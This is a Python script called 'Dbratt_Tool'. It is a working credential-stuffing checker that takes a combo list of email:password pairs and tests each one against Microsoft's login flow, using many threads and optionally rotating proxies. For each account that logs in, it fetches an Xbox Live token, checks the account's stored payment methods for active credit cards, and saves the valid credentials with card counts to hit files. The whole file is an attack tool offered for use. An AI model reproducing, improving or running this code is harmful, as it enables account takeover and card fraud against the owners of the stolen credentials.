import requests
import random
import urllib.parse
import string
import re
import tls_client
import json
import time
import yaml
import os
from datetime import datetime
from requests_toolbelt import MultipartEncoder
from colorama import Fore, Style, init
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from traceback import print_exc
from mojang import Client

if not os.path.exists("accs.txt"):
        with open("accs.txt", "w") as file:
            pass
with open("accs.txt", "r") as file:
    combo_count = sum(1 for _ in file)

total_accounts = combo_count
processed_accounts = 0
hits_count = 0
tfa_count = 0
bad_count = 0
start_time = time.time()


def update_cmd_title():
    elapsed_time = int(time.time() - start_time)
    minutes, seconds = divmod(elapsed_time, 60)
    hours, minutes = divmod(minutes, 60)
    percent_done = (processed_accounts / total_accounts) * 100 if total_accounts else 0
    title = f"Dbratt_Tool Left:{total_accounts - processed_accounts}/{total_accounts}({percent_done:.2f}%) Hits:{hits_count}  2FA:{tfa_count} Bad:{bad_count} Time:{hours}:{minutes}:{seconds}"
    os.system(f"title {title}")


flights = [
    "sc_allowvenmoforbuynow-universalwebstore",
    "sc_appendconversiontype",
    "sc_imagelazyload",
    "sc_pidlerrorhandler-minecraftnet",
    "sc_showvalidpis",
    "sc_checkoutitemfontweight",
    "sc_challengescenarioda",
    "sc_itemsubpricetsenabled",
    "sc_purchasedblockedby",
    "sc_passthroughculture",
    "sc_scdssapi",
    "sc_checkoutplaceordermoraybuttons",
    "sc_cartcoadobetelemetryfix",
    "sc_redirecttosignin",
    "sc_disablelistpichanges-storewindowsinapp",
    "sc_errorscenariotelemetry",
    "sc_buynowpmgrouping",
    "sc_paymentpickeritem",
    "sc_cleanreducercode",
    "sc_dimealipaystylingfix",
    "sc_asyncpurchasefailure",
    "sc_disablecsvforadd-xeweb",
    "sc_promocode",
    "sc_buynowpmgrouping-clipchamp",
    "sc_manualreviewcongrats",
    "sc_optionalcatalogclienttype",
    "sc_klarna",
    "sc_preparecheckoutrefactor",
    "sc_euomnibusprice",
    "sc_gcoitemeligibility",
    "sc_productimageoptimization",
    "sc_reactredeemv2",
    "sc_currencyformattingpkg",
    "sc_fixasyncpiflow",
    "sc_pidlnetworkerror",
    "sc_allowvenmoforbuynow",
    "sc_redeemupdateprofileredirect",
    "sc_promocodefeature-web-desktop",
    "sc_disabledpaymentoption",
    "sc_enablecartcreationerrorparsing",
    "sc_purchaseblock",
    "sc_returnoospsatocart",
    "sc_updatepopupstring",
    "sc_allowpaysafeforus",
    "sc_nextpidl",
    "sc_fixasyncpitelemetry",
    "sc_apperrorboundarytsenabled",
    "sc_allowupiqr",
    "sc_apgpinlineerror",
    "sc_allowpaysafeforus-minecraftnet",
    "sc_usenewinstructionstring",
    "sc_fincastlecallerapplicationidcheck",
    "sc_versionts",
    "sc_allowpaypalbnpl",
    "sc_officescds",
    "sc_allowpaypalbnplforcheckout",
    "sc_disableupgradetrycheckout",
    "sc_extendPageTagToOverride",
    "sc_mcupgrade",
    "sc_perfscenariofix",
    "sc_disablebuynowpmgrouping-officedime",
    "sc_skipselectpi",
    "sc_disablecsvforadd-minecraftnet",
    "sc_allowmpesapi",
    "sc_reloadiflineitemdiscrepancy",
    "sc_fatalerroractionsts",
    "sc_removereduxtoolkit",
    "sc_allowvenmo",
    "sc_spinnerts",
    "sc_buynowpmgrouping-storeapp",
    "sc_gifterroralert",
    "sc_achpaymentoptiontsenabled",
    "sc_shippingallowlist",
    "sc_autorenewalconsentnarratorfix",
    "sc_emptyresultcheck",
    "sc_bulkupdateproducts",
    "sc_buynowpagetsenabled",
    "sc_buynowpmgrouping-xboxcom",
    "sc_giftredeemlegalterms",
    "sc_abandonedretry",
    "sc_analyticsforbuynow",
    "sc_removelodash",
    "sc_isrighttoleftinpage",
    "sc_asyncpurchasefailurexboxcom",
    "sc_apploadingts",
    "sc_prominenteddchange",
    "sc_buynowpmgrouping-minecraftnet",
    "sc_disableshippingaddressinit",
    "sc_preparecheckoutperf",
    "sc_buynowuiprod",
    "sc_contentratingts",
    "sc_allowvenmoforbuynow-xboxcom",
    "sc_rspv2",
    "sc_buynowlistpichanges",
    "sc_disableupiforbuynow-officedime",
    "sc_allowpaysafeforus-storeapp",
    "sc_expiredcardnextbutton",
    "sc_uuid",
    "sc_checkoutasyncpurchase",
    "sc_readytopurchasefix",
    "sc_enablelegalrequirements",
    "sc_pidlignoreesckey",
    "sc_expanded.purchasespinner",
    "sc_trycheckoutnobackup",
    "sc_disablevenmoforbuynow-officedime",
    "sc_hideredeemclient-minecraftnet",
    "sc_buynowpmgrouping-universalwebstore",
    "sc_giftingtelemetryfix",
    "sc_alwayscartmuid",
    "sc_checkoutloadspinner",
    "sc_reactredeem-storewindowsinapp",
    "sc_perfloadeventfix",
    "sc_usekoreanlegaltermstring",
    "sc_purchaseredirectcontinuets",
    "sc_fincastleui",
    "sc_updateprofiletsenabled",
    "sc_flexsubs",
    "sc_notfoundts",
    "sc_useonedscookiemanager",
    "sc_scenariotelemetryrefactor",
    "sc_promocodefocus",
    "sc_onbodytsenabled",
    "sc_pidlerrorhandler-storeapp",
    "sc_bankchallengecheckout",
    "sc_allowupiqrforbuynow",
    "sc_fixforonlyasyncpiselect",
    "sc_railv2",
    "sc_checkoutglobalpiadd",
    "sc_reactcheckout",
    "sc_minmaxcheck",
    "sc_helpv2",
    "sc_xboxcomnosapi",
    "sc_updateredemptionlink",
    "sc_reactredeem-universalwebstore",
    "sc_clientdebuginfo",
    "sc_productlegaltermsv1ts",
    "sc_pidlerrorhandler-xeweb",
    "sc_reactredeem-storeapp",
    "sc_hidedisabledpis",
    "sc_paymentoptionnotfound",
    "sc_removeresellerforstoreapp",
    "sc_hideshippingfee",
    "sc_enablekakaopay",
    "sc_checkoutcontactpreference",
    "sc_ordercheckoutfix",
    "sc_disablecsvforadd-xboxcom",
    "sc_calldccforasyncpi",
    "sc_promostepstatus",
    "sc_buynowglobalpiadd",
    "sc_overlayfix",
    "sc_buynowpmgrouping-skypecom",
    "sc_buynowuipreload",
    "sc_bnplmsgcart",
    "sc_updatebillinginfo",
    "sc_buynowpmgrouping-cascadewebstore",
    "sc_allowpaysafeforus-xboxcom",
    "sc_buynowpmgrouping-surfaceapp",
    "sc_readymessagemark",
    "sc_allowupiforbuynow",
    "sc_redeemerroralert",
    "sc_xboxcomasyncpurchase",
    "sc_disablebuynowpmgrouping-storewindowsinapp",
    "sc_askaparentroutetsenabled",
    "sc_errorcartinfotelemetry",
    "sc_skypenonactiveerror",
    "sc_skippurchaseconfirm",
    "sc_buynowfocustrapkeydown",
    "sc_shareddowngrade",
    "sc_addasyncpitelemetry",
    "sc_eligibilityapi",
    "sc_paymentchallengetsenabled",
    "sc_allowvenmoforbuynow-minecraftnet",
    "sc_removesetpaymentmethod",
    "sc_ordereditforincompletedata",
    "sc_disablecsvforadd-xenative",
    "sc_bankchallenge",
    "sc_billingaddressbuttontsenabled",
    "sc_allowelo",
    "sc_asyncpiurlupdate",
    "sc_upistringchanges",
    "sc_delayretry",
    "sc_pidlerrorhandler-xboxcom",
    "sc_allowupi",
    "sc_hidesubscriptionprice",
    "sc_perfredeemcomplete",
    "sc_loadtestheadersenabled",
    "sc_conversionblockederror",
    "sc_cleanuppromocodes",
    "sc_mcrenewaldatev2",
    "sc_allowpaysafecard",
    "sc_telemetryforbillingemail",
    "sc_pidlloading",
    "sc_addfocuslocktosubscriptionmodal",
    "sc_purchasedblocked",
    "sc_outofstock",
    "sc_buynowpagexboxts",
    "sc_allowcustompifiltering",
    "sc_purchaseblockerrorhandling",
    "sc_perfsummary",
    "sc_buynowcontactpref",
    "sc_errorpageviewfix",
    "sc_newcheckoutselectorforxboxcom",
    "sc_splipidltresourcehelper",
    "sc_xboxredirection",
    "sc_setbehaviordefaultvalue",
    "sc_clienttelemetryforceenabled",
    "sc_allowpaysafeforus-universalwebstore",
    "sc_updateratingdescription",
    "sc_paymentoptionlistts",
    "sc_formatjsxts",
    "sc_lowbardiscountmap",
    "sc_moraystyle",
    "sc_contactpreferenceupdate",
    "sc_paymentsessiontsenabled",
    "sc_hipercard",
    "sc_uppercasepromocode",
    "sc_resellerdetail",
    "sc_askaparentinsufficientbalance",
    "sc_fincastlecalculation",
    "sc_moderngamertaggifting",
    "sc_allowvenmoforcheckout",
    "sc_xdlshipbuffer",
    "sc_allowverve",
    "sc_inlinetempfix",
    "sc_purchaseredirectwaitts",
    "sc_upgrademodaltrycheckout",
    "sc_devicerepairpifilter",
    "sc_statusts",
    "sc_disablecsvforadd-xboxsocial",
    "sc_greenshipping",
    "sc_blocklegacyupgrade",
    "sc_minecraftctasupdate",
    "sc_disablecsvforadd",
]
lock = Lock()
config = yaml.safe_load(open("config.yml", "r"))["data"]
init()


class Logger:
    @staticmethod
    def Sprint(tag: str, content: str, color):
        timestamp = f"{Fore.RESET}{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M:%S')}] | {Fore.RESET}"
        with lock:
            print(
                Style.BRIGHT + timestamp + color + f" [{tag}] " + Fore.RESET + content
            )

    @staticmethod
    def Ask(tag: str, content: str, color):
        timestamp = f"{Fore.RESET}{Fore.LIGHTBLACK_EX}{datetime.now().strftime('%H:%M:%S')}{Fore.RESET}"
        return input(
            Style.BRIGHT + timestamp + color + f" [{tag}] " + Fore.RESET + content
        )


class Purchase:
    def __init__(self, ms_creds: str, show_bad_logs: bool, show_tfa_logs: bool):
        self.ms_creds = ms_creds
        self.email, self.password = ms_creds.split(":")
        self.auth_session = requests.Session()
        self.show_bad_logs = show_bad_logs
        self.show_tfa_logs = show_tfa_logs
        prxs_lst = []#make list of proxies
        if prxs_lst:
          proxi = random.choice(prxs_lst)
          fmtRotate = {
            'http': proxi,
            'https': proxi
          } 
        else:
            fmtRotate = None
        self.auth_session.proxies = fmtRotate
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
        self._run()

    @staticmethod
    def generateHexStr(len: int):
        return "".join(
            random.choices(
                "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k=len
            )
        )

    @staticmethod
    def remove_content(filename: str, delete_line: str) -> None:
        with open(filename, "r+") as io:
            content = io.readlines()
            io.seek(0)
            for line in content:
                if not (delete_line in line):
                    io.write(line)
            io.truncate()

    def auth_get_request(self, *args, **kwargs):
        try:
            return self.auth_session.get(*args, **kwargs)
        except requests.RequestException as e:
            print(e)
            return None

    def auth_post_request(self, *args, **kwargs):
        try:
            return self.auth_session.post(*args, **kwargs)
        except requests.RequestException as e:
            print(e)
            return None

    def purchase_get_request(self, *args, **kwargs):
        while True:
            try:
                r = self.purchase_session.get(*args, **kwargs)
                return r
            except:
                continue

    def purchase_post_request(self, *args, **kwargs):
        while True:
            try:
                r = self.purchase_session.post(*args, **kwargs)
                return r
            except:
                continue

    def purchase_put_request(self, *args, **kwargs):
        while True:
            try:
                return self.purchase_session.put(*args, **kwargs)
            except:
                continue

    def doPrivacyNotice(self):
        privNotifUrl = self.loginResp.text.split('name="fmHF" id="fmHF" action="')[
            1
        ].split('"')[0]
        corelationId = self.loginResp.text.split(
            'name="correlation_id" id="correlation_id" value="'
        )[1].split('"')[0]
        mCode = self.loginResp.text.split(
            'type="hidden" name="code" id="code" value="'
        )[1].split('"')[0]

        priveNotifPage = self.auth_post_request(
            privNotifUrl, data={"correlation_id": corelationId, "code": mCode}
        ).text

        privNotifPostData = {
            "AppName": "ALC",
            "ClientId": priveNotifPage.split("ucis.ClientId = '")[1].split("'")[0],
            "ConsentSurface": "SISU",
            "ConsentType": "ucsisunotice",
            "correlation_id": corelationId,
            "CountryRegion": priveNotifPage.split("ucis.CountryRegion = '")[1].split(
                "'"
            )[0],
            "DeviceId": "",
            "EncryptedRequestPayload": priveNotifPage.split(
                "ucis.EncryptedRequestPayload = '"
            )[1].split("'")[0],
            "FormFactor": "Desktop",
            "InitVector": priveNotifPage.split("ucis.InitVector = '")[1].split("'")[0],
            "Market": priveNotifPage.split("ucis.Market = '")[1].split("'")[0],
            "ModelType": "ucsisunotice",
            "ModelVersion": "1.11",
            "NoticeId": priveNotifPage.split("ucis.NoticeId = '")[1].split("'")[0],
            "Platform": "Web",
            "UserId": priveNotifPage.split("ucis.UserId = '")[1].split("'")[0],
            "UserVersion": "1",
        }
        privNotifPostData_m = MultipartEncoder(
            fields=privNotifPostData,
            boundary="----WebKitFormBoundary"
            + "".join(random.sample(string.ascii_letters + string.digits, 16)),
        )

        self.auth_post_request(
            "https://privacynotice.account.microsoft.com/recordnotice",
            headers={
                "authority": "privacynotice.account.microsoft.com",
                "accept": "application/json, text/plain, */*",
                "accept-language": "en-US,en;q=0.7",
                "content-type": privNotifPostData_m.content_type,
                "origin": "https://privacynotice.account.microsoft.com",
                "referer": privNotifUrl,
                "sec-gpc": "1",
                "user-agent": self.user_agent,
            },
            data=privNotifPostData_m,
        )

        self.auth_session.headers[
            "Referer"
        ] = "https://privacynotice.account.microsoft.com/"
        returnUrl = urllib.parse.unquote(privNotifUrl.split("notice?ru=")[1])
        self.loginResp = self.auth_get_request(returnUrl)

    def fetchAuth(self):
        self.auth_session.headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "identity",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Sec-GPC": "1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": self.user_agent,
        }

        getLoginPage = self.auth_session.get(
            "https://login.live.com/ppsecure/post.srf"
        ).text

        if not ",urlPost:'" in getLoginPage:
            Logger.Sprint("ERROR", "Failed To Get Login Page Data!", Fore.LIGHTRED_EX)
            return "fail"

        self.flowToken1 = getLoginPage.split(
            ''''<input type="hidden" name="PPFT" id="i0327" value="'''
        )[1].split('"')[0]
        self.loginPostUrl = getLoginPage.split(",urlPost:'")[1].split("'")[0]
        self.credentialsUrl = getLoginPage.split("Cd:'")[1].split("'")[0]
        self.uaid = self.auth_session.cookies.get_dict()["uaid"]

        loginPostData = f"i13=0&login={self.email}&loginfmt={self.email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={self.password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={self.flowToken1}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=449894"
        self.auth_session.headers["Origin"] = "https://login.live.com"
        self.auth_session.headers["Referer"] = "https://login.live.com/"
        loginHeaders = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Sec-GPC": "1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": self.user_agent,
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }

        self.loginResp = self.auth_session.post(
            self.loginPostUrl, data=loginPostData, headers=loginHeaders
        )
        if "https://account.live.com/recover" in self.loginResp.text:
            return "fail"
        if "https://privacynotice.account.microsoft.com/notice" in self.loginResp.text:
            self.doPrivacyNotice()
        if not "sFT:" in self.loginResp.text:
            return "fail"

        self.flowToken2 = re.findall("sFT:'(.+?(?='))", self.loginResp.text)[0]
        self.loginPostUrl2 = re.findall("urlPost:'(.+?(?='))", self.loginResp.text)[0]

        loginPostData2 = {
            "LoginOptions": "3",
            "type": "28",
            "ctx": "",
            "hpgrequestid": "",
            "PPFT": self.flowToken2,
            "i19": str(random.randint(10000, 30000)),
        }
        self.auth_session.headers["Referer"] = self.loginPostUrl
        self.auth_session.headers["Origin"] = "https://login.live.com"
        midAuth2 = self.auth_post_request(self.loginPostUrl2, data=loginPostData2).text

        accountXbox = self.auth_get_request(
            "https://account.xbox.com/",
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Sec-GPC": "1",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": self.user_agent,
            },
        ).text
        if "fmHF" in accountXbox:
            xbox_json = {
                "fmHF": accountXbox.split('id="fmHF" action="')[1].split('"')[0],
                "pprid": accountXbox.split('id="pprid" value="')[1].split('"')[0],
                "nap": accountXbox.split('id="NAP" value="')[1].split('"')[0],
                "anon": accountXbox.split('id="ANON" value="')[1].split('"')[0],
                "t": accountXbox.split('id="t" value="')[1].split('"')[0],
            }

            verifyToken = (
                self.auth_post_request(
                    xbox_json["fmHF"],
                    timeout=20,
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    data={
                        "pprid": xbox_json["pprid"],
                        "NAP": xbox_json["nap"],
                        "ANON": xbox_json["anon"],
                        "t": xbox_json["t"],
                    },
                )
                .text.split('name="__RequestVerificationToken" type="hidden" value="')[
                    1
                ]
                .split('"')[0]
            )
            self.auth_post_request(
                "https://account.xbox.com/en-us/xbox/account/api/v1/accountscreation/CreateXboxLiveAccount",
                headers={
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin": "https://account.xbox.com",
                    "Referer": xbox_json["fmHF"],
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-GPC": "1",
                    "User-Agent": self.user_agent,
                    "X-Requested-With": "XMLHttpRequest",
                    "__RequestVerificationToken": verifyToken,
                },
                data={
                    "partnerOptInChoice": "false",
                    "msftOptInChoice": "false",
                    "isChild": "true",
                    "returnUrl": "https://www.xbox.com/en-US/?lc=1033",
                },
            )
        getXbl = self.auth_get_request(
            f"https://account.xbox.com/en-us/auth/getTokensSilently?rp=http://xboxlive.com,http://mp.microsoft.com/,http://gssv.xboxlive.com/,rp://gswp.xboxlive.com/,http://sisu.xboxlive.com/"
        ).text
        try:
            rel = getXbl.split('"http://mp.microsoft.com/":{')[1].split("},")[0]
            json_obj = json.loads("{" + rel + "}")
            xbl_auth = "XBL3.0 x=" + json_obj["userHash"] + ";" + json_obj["token"]
            return xbl_auth
        except:
            Logger.Sprint("ERROR", "Failed to get XBL Authorization!", Fore.LIGHTRED_EX)
            return "fail"

    def getCartsHeader(self):
        return {
            "authority": "cart.production.store-web.dynamics.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "authorization": self.xbl3,
            "content-type": "application/json",
            "ms-cv": f"{self.generateHexStr(22)}.0.4",
            "origin": "https://www.microsoft.com",
            "referer": "https://www.microsoft.com/",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": self.user_agent,
            "x-authorization-muid": self.muid,
            "x-ms-correlation-id": self.corId,
            "x-ms-tracking-id": self.trackId,
            "x-ms-vector-id": self.vectorId,
        }

    def pm_mp_headers(self):
        return {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Origin": "https://www.microsoft.com",
            "Referer": "https://www.microsoft.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": self.user_agent,
            "authorization": self.xbl3,
            "content-type": "application/json",
            "correlation-context": f"v=1,ms.b.tel.scenario=commerce.payments.PaymentSessioncreatePaymentSession.1,ms.b.tel.partner=XboxCom,ms.c.cfs.payments.partnerSessionId={self.generateHexStr(22)}",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "x-ms-flight": "EnableThreeDSOne",
            "x-ms-pidlsdk-version": "1.22.0_reactview",
        }

    def getAvailibilityId(self):
        return self.purchase_get_request(
            f"https://displaycatalog.mp.microsoft.com/v7/products/{self.productId}?languages=Nuetral&market={self.market}"
        ).json()["Product"]["DisplaySkuAvailabilities"][0]["Availabilities"][0][
            "AvailabilityId"
        ]

    def getPaymentMethods(self):
        getPMMethods = requests.get(
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US&partner=webblends",
            headers={"authorization": self.xbl3},
        ).json()

        instruments = []
        for pm in getPMMethods:
            if (
                pm["paymentMethod"]["paymentMethodFamily"] == "credit_card"
                and pm["status"] == "Active"
            ):
                instruments.append(
                    {"id": pm["id"], "market": pm["details"]["address"]["country"]}
                )
        return [i for n, i in enumerate(instruments) if i not in instruments[:n]]

    @staticmethod
    def append_to_file(filename: str, line: str) -> None:
        """Append a line to a file, creating the file if it does not exist."""
        with open(filename, "a") as file:
            file.write(line + "\n")

    @staticmethod
    def remove_line_from_file(filename: str, line_to_remove: str) -> None:
        """Remove a specific line from a file."""
        with open(filename, "r") as file:
            lines = file.readlines()
        with open(filename, "w") as file:
            for line in lines:
                if line.strip("\n") != line_to_remove:
                    file.write(line)

    def run(self):
        global processed_accounts, hits_count, tfa_count, bad_count

        try:
            self.xbl3 = self.fetchAuth()

            if self.xbl3 != "fail":

                instruments = self.getPaymentMethods()
                if not instruments:
                    if self.show_bad_logs:
                        Logger.Sprint(
                            "Bad",
                            f"Microsoft Hit but no cards found -> {self.email}",
                            Fore.YELLOW,
                        )
                    Purchase.append_to_file(
                        "hits_without_cards.txt", f"{self.email}:{self.password}"
                    )
                else:
                    market_counts = {}
                    for instrument in instruments:
                        market = instrument["market"]
                        market_counts[market] = market_counts.get(market, 0) + 1

                    market_display = " ".join(
                        [
                            f"[{market}_x{count}]"
                            for market, count in market_counts.items()
                        ]
                    )

                    card_text = "card" if len(instruments) == 1 else "cards"

                    Logger.Sprint(
                        "SUCCESS",
                        f" | Microsoft Hit: {self.email}:{self.password}",
                        Fore.LIGHTGREEN_EX,
                    )
                    hits_count += 1
                    Purchase.append_to_file(
                        "hits.txt",
                        f"[Microsoft Hit] {self.email}:{self.password} | {len(instruments)} {card_text} {market_display}",
                    )

            else:
                processed_accounts += 1
                if "2fa" in self.xbl3:
                    tfa_count += 1
                else:
                    bad_count += 1

            Purchase.remove_line_from_file("accs.txt", self.ms_creds)
            update_cmd_title()

        except Exception as e:
            Purchase.remove_line_from_file("accs.txt", self.ms_creds)
            update_cmd_title()

    def _run(self):
        try:
            self.run()
        except:
            pass


if __name__ == "__main__":
    if not os.path.exists("accs.txt"):
        with open("accs.txt", "w") as file:
            pass

    os.system("cls")
    logo = """
    ██████╗░██████╗░██████╗░░█████╗░████████╗████████╗  ████████╗░█████╗░░█████╗░██╗░░░░░
    ██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝╚══██╔══╝  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
    ██║░░██║██████╦╝██████╔╝███████║░░░██║░░░░░░██║░░░  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
    ██║░░██║██╔══██╗██╔══██╗██╔══██║░░░██║░░░░░░██║░░░  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
    ██████╔╝██████╦╝██║░░██║██║░░██║░░░██║░░░░░░██║░░░  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗
    ╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝
    """
    print(Style.BRIGHT + Fore.LIGHTBLUE_EX + logo + Style.RESET_ALL)
    print("-" * 50)

    try:
        with open("accs.txt", "r") as file:
            combo_count = sum(1 for _ in file)
    except FileNotFoundError:
        print(Fore.RED + "Error: 'accs.txt' not found." + Style.RESET_ALL)
        input("Press any key to exit...")
        exit()

    if combo_count == 0:
        print(Fore.YELLOW + "There are 0 accounts in accs.txt." + Style.RESET_ALL)
        input("Press any key to exit...")
        exit()
    else:
        print(f"{Fore.LIGHTGREEN_EX}Combo Quantity: {combo_count}")

    threads = int(Logger.Ask("THREADS", "Enter Thread Amount : ", Fore.LIGHTBLUE_EX))
    bad_output = Logger.Ask(
        "Bad_output", "Bad_output (True/False): ", Fore.LIGHTBLUE_EX
    )
    tfa_output = Logger.Ask(
        "2fa_output", "2fa_output (True/False): ", Fore.LIGHTBLUE_EX
    )

    show_bad_logs = bad_output.lower() != "false"
    show_tfa_logs = tfa_output.lower() != "false"

    with ThreadPoolExecutor(max_workers=threads) as exc:
        for acc in open("accs.txt").read().splitlines():
            exc.submit(Purchase, acc, show_bad_logs, show_tfa_logs)